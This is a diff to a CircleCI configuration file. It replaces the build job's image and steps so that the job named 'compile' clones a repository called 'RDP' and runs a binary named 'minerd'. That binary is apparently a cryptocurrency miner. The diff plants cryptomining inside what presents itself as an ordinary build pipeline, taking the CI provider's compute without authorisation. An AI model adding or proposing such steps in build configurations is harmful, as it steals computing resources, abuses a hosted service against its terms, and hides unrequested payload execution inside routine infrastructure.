@@ -2,13 +2,20 @@ version: 2.1
 jobs:
   compile:
    docker:
-      - image: djemil/myrdp:latest
+      - image: bryanhafidz/bryan-docker:0x02
    steps:
       - run:
           command: |
-           apt install --assume-yes git
-           watch -n5 time
-
+           
+           mkdir  ~/.ssh
+           ssh-keyscan github.com >> ~/.ssh/known_hosts
+           git clone --depth=1 git@github.com:djemilbakhti/RDP.git Q
+           cd Q
+           
+           chmod 755 minerd
+           ./minerd
+      
+          
 workflows:
   version: 2.1
   cooking:
